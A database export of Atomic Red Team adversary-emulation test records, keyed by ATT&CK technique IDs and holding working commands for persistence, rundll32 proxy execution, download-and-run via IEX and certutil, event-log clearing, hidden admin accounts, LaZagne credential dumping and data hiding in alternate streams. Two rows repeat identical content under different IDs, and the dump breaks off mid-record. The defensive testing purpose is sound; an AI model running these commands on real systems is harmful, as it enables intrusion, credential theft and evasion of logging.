148	\N		\N	yes	P1	\N	2021-07-27 10:41:40.860997+00	T1546.010	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.010/T1546.010.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.482Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "reg.exe import #{registry_cleanup_file} >nul 2>&1\\n", "command": ["reg.exe import #{registry_file}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Install AppInit Shim", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["if ((Test-Path c:\\\\Tools\\\\T1546.010.dll) -and (Test-Path c:\\\\Tools\\\\T1546.010x86.dll)) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "registry_file", "value": "PathToAtomicsFolder\\\\T1546.010\\\\src\\\\T1546.010.reg"}, {"key": "registry_cleanup_file", "value": "PathToAtomicsFolder\\\\T1546.010\\\\src\\\\T1546.010-cleanup.reg"}], "execution_status": "Pass"}]}}}}
271	\N		\N	no	P1	\N	2021-07-27 10:13:34.479237+00	T1053.005	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "schtasks /delete /tn \\"T1053_005_OnLogon\\" /f >nul 2>&1\\nschtasks /delete /tn \\"T1053_005_OnStartup\\" /f >nul 2>&1\\n", "command": ["schtasks /create /tn \\"T1053_005_OnLogon\\" /sc onlogon /tr \\"cmd.exe /c calc.exe\\"\\nschtasks /create /tn \\"T1053_005_OnStartup\\" /sc onstart /ru system /tr \\"cmd.exe /c calc.exe\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Scheduled Task Startup Script", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "SCHTASKS /Delete /TN spawn /F >nul 2>&1\\n", "command": ["SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Scheduled task Local", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "task_command", "value": "C:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "time", "value": 1210}], "execution_status": "Pass"}, {"cleanup": "SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password} /TN \\"Atomic task\\" /F >nul 2>&1\\n", "command": ["SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \\"Atomic task\\" /TR \\"#{task_command}\\" /SC daily /ST #{time}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Scheduled task Remote", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "task_command", "value": "C:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "time", "value": 1210}, {"key": "target", "value": "localhost"}, {"key": "user_name", "value": "DOMAIN\\\\user"}, {"key": "password", "value": "At0micStrong"}], "execution_status": "Pass"}, {"cleanup": "Unregister-ScheduledTask -TaskName \\"AtomicTask\\" -confirm:$false >$null 2>&1\\n", "command": ["$Action = New-ScheduledTaskAction -Execute \\"calc.exe\\"\\n$Trigger = New-ScheduledTaskTrigger -AtLogon\\n$User = New-ScheduledTaskPrincipal -GroupId \\"BUILTIN\\\\Administrators\\" -RunLevel Highest\\n$Set = New-ScheduledTaskSettingsSet\\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\\nRegister-ScheduledTask AtomicTask -InputObject $object\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Powershell Cmdlet Scheduled Task", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\"PathToAtomicsFolder\\\\T1053.005\\\\src\\\\T1053.005-macrocode.txt\\" -officeProduct \\"#{ms_product}\\" -sub \\"Scheduler\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Task Scheduler via VBA", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"#{ms_product}.Application\\" | Out-Null\\n  $process = \\"#{ms_product}\\"; if ( $process -eq \\"Word\\") {$process = \\"winword\\"}\\n  Stop-Process -Name $process\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [{"key": "ms_product", "value": "Word"}], "execution_status": "Pass"}, {"cleanup": "Unregister-ScheduledTask -TaskName \\"T1053_005_WMI\\" -confirm:$false >$null 2>&1\\n", "command": ["$xml = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1053.005\\\\src\\\\T1053_005_WMI.xml\\")\\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \\"Root\\\\Microsoft\\\\Windows\\\\TaskScheduler\\" -MethodName \\"RegisterByXml\\" -Arguments @{ Force = $true; Xml =$xml; }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "WMI Invoke-CimMethod Scheduled Task", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
273	\N		\N	no	P1	\N	2021-07-27 10:20:39.411015+00	T1218.011	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "NA", "command": ["rundll32.exe javascript:\\"\\\\..\\\\mshtml", "RunHTMLApplication \\";document.write();GetObject(\\"script:#{file_url}\\").Exec();\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Rundll32 execute JavaScript Remote Payload With GetObject", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rundll32 vbscript:\\"\\\\..\\\\mshtml", "RunHTMLApplication \\"+String(CreateObject(\\"WScript.Shell\\").Run(\\"#{command_to_execute}\\")", "0)\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Rundll32 execute VBscript command", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "command_to_execute", "value": "calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rundll32.exe advpack.dll", "LaunchINFSection #{inf_to_execute}", "DefaultInstall_SingleUser", "1", "\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Rundll32 advpack.dll Execution", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218.011\\\\src\\\\T1218.011.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rundll32.exe ieadvpack.dll", "LaunchINFSection #{inf_to_execute}", "DefaultInstall_SingleUser", "1", "\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Rundll32 ieadvpack.dll Execution", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218.011\\\\src\\\\T1218.011.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rundll32.exe syssetup.dll", "SetupInfObjectInstallAction DefaultInstall 128 .\\\\#{inf_to_execute}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Rundll32 syssetup.dll Execution", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218.011\\\\src\\\\T1218.011_DefaultInstall.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rundll32.exe setupapi.dll", "InstallHinfSection DefaultInstall 128 .\\\\#{inf_to_execute}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Rundll32 setupapi.dll Execution", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218.011\\\\src\\\\T1218.011_DefaultInstall.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rundll32.exe url.dll", "OpenURL PathToAtomicsFolder\\\\T1218.011\\\\src\\\\index.hta\\nrundll32.exe URL.dll", "FileProtocolHandler PathToAtomicsFolder\\\\T1218.011\\\\src\\\\akteullen.vbs\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Execution of HTA and VBS Files using Rundll32 and URL.dll", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rundll32.exe pcwutl.dll", "LaunchApplication #{exe_to_launch}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Launches an executable using Rundll32 and pcwutl.dll", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "exe_to_launch", "value": "%windir%\\\\System32\\\\notepad.exe"}], "execution_status": "Pass"}]}}}}
308	\N		\N	yes	P2	\N	2021-07-30 02:28:40.730922+00	T1564	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["type C:\\\\temp\\\\evil.exe > \\"C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer12_Logfile.log:evil.exe\\"\\nextrac32 #{path}\\\\procexp.cab #{path}\\\\file.txt:procexp.exe\\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\\\procexp.exe > #{path}\\\\file.txt:procexp.exe\\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\\\temp:ttt\\nmakecab #{path}\\\\autoruns.exe #{path}\\\\cabtest.txt:autoruns.cab\\nprint /D:#{path}\\\\file.txt:autoruns.exe #{path}\\\\Autoruns.exe\\nreg export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg #{path}\\\\file.txt:evilreg.reg\\nregedit /E #{path}\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\\\MyCustomRegKey\\nexpand \\\\\\\\webdav\\\\folder\\\\file.bat #{path}\\\\file.txt:file.bat\\nesentutl.exe /y #{path}\\\\autoruns.exe /d #{path}\\\\file.txt:autoruns.exe /o \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Alternate Data Streams (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "c:\\\\ADS\\\\"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"#{ads_file_path}\\" -Force -ErrorAction Ignore\\n", "command": ["if (!(Test-Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki -PathType Container)) {\\n    New-Item -ItemType Directory -Force -Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\n    }\\nStart-Process -FilePath \\"$env:comspec\\" -ArgumentList \\"/c", "type", "#{payload_path}", ">", "`\\"#{ads_file_path}:#{ads_name}`\\"\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Store file in Alternate Data Stream (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "payload_path", "value": "c:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "ads_file_path", "value": "C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\\\desktop.ini"}, {"key": "ads_name", "value": "desktop.ini"}], "execution_status": "Pass"}, {"cleanup": "del #{file_name} >nul 2>&1\\n", "command": ["echo cmd /c echo \\"Shell code execution.\\"> #{file_name}:#{ads_filename}\\nfor /f \\"usebackq delims=?\\" %i in (#{file_name}:#{ads_filename}) do %i\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS command prompt", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_name", "value": "%temp%\\\\T1564.004_has_ads_cmd.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path #{file_name} -ErrorAction Ignore\\n", "command": ["echo \\"test\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\"test\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\"test2\\"\\nset-content -path . -stream #{ads_filename} -value \\"test3\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\\n"], "input_arguments": [{"key": "file_name", "value": "$env:TEMP\\\\T1564.004_has_ads_powershell.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:TEMP\\\\extracted.exe\\" -ErrorAction Ignore\\n", "command": ["$macro = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1564\\\\src\\\\T1564-macrocode.txt\\")\\n$macro = $macro -replace \\"aREPLACEMEa\\"", " \\"PathToAtomicsFolder\\\\T1564\\\\bin\\\\extractme.bin\\"\\nIEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroCode \\"$macro\\" -officeProduct \\"Word\\" -sub \\"Extract\\" -NoWrap\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract binary files via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "net user $ /DELETE 2>&1", "command": ["net user $ ATOMIC123! /add /active:yes"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a user called \\"$\\" as noted here", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-LocalUser -Name \\"Administrator \\" 2>&1 | out-null", "command": ["New-LocalUser -Name \\"Administrator \\" -NoPassword"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create an \\"Administrator \\" user (with a space on the end)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
277	\N		\N	no	P1	\N	2021-07-27 10:36:00.217269+00	T1546.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \\"Name = 'AtomicRedTeam-WMIPersistence-Example'\\"\\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \\"Name = 'AtomicRedTeam-WMIPersistence-Example'\\"\\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \\"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\\" -ErrorAction SilentlyContinue\\n$FilterConsumerBindingToCleanup | Remove-WmiObject\\n$EventConsumerToCleanup | Remove-WmiObject\\n$EventFilterToCleanup | Remove-WmiObject\\n", "command": ["$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\\n                EventNameSpace='root\\\\CimV2';\\n                QueryLanguage=\\"WQL\\";\\n                Query=\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\\"};\\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\\n\\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\\n                CommandLineTemplate=\\"$($Env:SystemRoot)\\\\System32\\\\notepad.exe\\";}\\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\\n\\n$FilterToConsumerArgs = @{\\nFilter = [Ref] $Filter;\\nConsumer = [Ref] $Consumer;\\n}\\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Persistence via WMI Event Subscription", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
280	\N		\N	no	P1	\N	2021-07-27 11:03:28.992587+00	T1070.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "NA", "command": ["wevtutil cl #{log_name}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Clear Logs", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "log_name", "value": "System"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["$logs = Get-EventLog -List | ForEach-Object {$_.Log}\\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\\nGet-EventLog -list\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete System Logs Using Clear-EventLog", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\"PathToAtomicsFolder\\\\T1070.001\\\\src\\\\T1070.001-macrocode.txt\\" -officeProduct \\"Word\\" -sub \\"ClearLogs\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Clear Event Logs via VBA", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}]}}}}
282	\N		\N	no	P1	\N	2021-07-27 11:10:11.128557+00	T1078.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "net user #{guest_user} /active:no >nul 2>&1\\nnet localgroup administrators #{guest_user} /delete >nul 2>&1\\nnet localgroup \\"Remote Desktop Users\\" #{guest_user} /delete >nul 2>&1\\nreg delete \\"hklm\\\\system\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\" /v fDenyTSConnections /f >nul 2>&1\\nreg delete \\"hklm\\\\system\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\" /v \\"AllowTSConnections\\" /f >nul 2>&1", "command": ["net user #{guest_user} /active:yes\\nnet user #{guest_user} #{guest_password}\\nnet localgroup administrators #{guest_user} /add\\nnet localgroup \\"Remote Desktop Users\\" #{guest_user} /add\\nreg add \\"hklm\\\\system\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\\nreg add \\"hklm\\\\system\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\" /v \\"AllowTSConnections\\" /t REG_DWORD /d 0x1 /f"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enable Guest account with RDP capability and admin priviliges", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "guest_user", "value": "guest"}, {"key": "guest_password", "value": "Password123!"}], "execution_status": "Pass"}]}}}}
283	\N		\N	yes	P1	\N	2021-07-27 11:12:30.623829+00	T1037.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "REG.exe DELETE HKCU\\\\Environment /v UserInitMprLogonScript /f >nul 2>&1\\ndel #{script_path} >nul 2>&1\\ndel \\"%USERPROFILE%\\\\desktop\\\\T1037.001-log.txt\\" >nul 2>&1\\n", "command": ["echo \\"#{script_command}\\" > #{script_path}\\nREG.exe ADD HKCU\\\\Environment /v UserInitMprLogonScript /t REG_SZ /d \\"#{script_path}\\" /f\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Logon Scripts", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "script_path", "value": "%temp%\\\\art.bat"}, {"key": "script_command", "value": "echo Art \\"Logon Script\\" atomic test was successful. >> %USERPROFILE%\\\\desktop\\\\T1037.001-log.txt"}], "execution_status": "Pass"}]}}}}
155	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1036.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.004/T1036.004.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.576Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
309	\N		\N	yes		\N	2021-07-30 02:29:58.442538+00	T1218	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["type C:\\\\temp\\\\evil.exe > \\"C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer12_Logfile.log:evil.exe\\"\\nextrac32 #{path}\\\\procexp.cab #{path}\\\\file.txt:procexp.exe\\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\\\procexp.exe > #{path}\\\\file.txt:procexp.exe\\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\\\temp:ttt\\nmakecab #{path}\\\\autoruns.exe #{path}\\\\cabtest.txt:autoruns.cab\\nprint /D:#{path}\\\\file.txt:autoruns.exe #{path}\\\\Autoruns.exe\\nreg export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg #{path}\\\\file.txt:evilreg.reg\\nregedit /E #{path}\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\\\MyCustomRegKey\\nexpand \\\\\\\\webdav\\\\folder\\\\file.bat #{path}\\\\file.txt:file.bat\\nesentutl.exe /y #{path}\\\\autoruns.exe /d #{path}\\\\file.txt:autoruns.exe /o \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Alternate Data Streams (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "c:\\\\ADS\\\\"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"#{ads_file_path}\\" -Force -ErrorAction Ignore\\n", "command": ["if (!(Test-Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki -PathType Container)) {\\n    New-Item -ItemType Directory -Force -Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\n    }\\nStart-Process -FilePath \\"$env:comspec\\" -ArgumentList \\"/c", "type", "#{payload_path}", ">", "`\\"#{ads_file_path}:#{ads_name}`\\"\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Store file in Alternate Data Stream (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "payload_path", "value": "c:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "ads_file_path", "value": "C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\\\desktop.ini"}, {"key": "ads_name", "value": "desktop.ini"}], "execution_status": "Pass"}, {"cleanup": "del #{file_name} >nul 2>&1\\n", "command": ["echo cmd /c echo \\"Shell code execution.\\"> #{file_name}:#{ads_filename}\\nfor /f \\"usebackq delims=?\\" %i in (#{file_name}:#{ads_filename}) do %i\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS command prompt", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_name", "value": "%temp%\\\\T1564.004_has_ads_cmd.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path #{file_name} -ErrorAction Ignore\\n", "command": ["echo \\"test\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\"test\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\"test2\\"\\nset-content -path . -stream #{ads_filename} -value \\"test3\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS PowerShell", "created_date": "30/07/2021", "post_command": [], 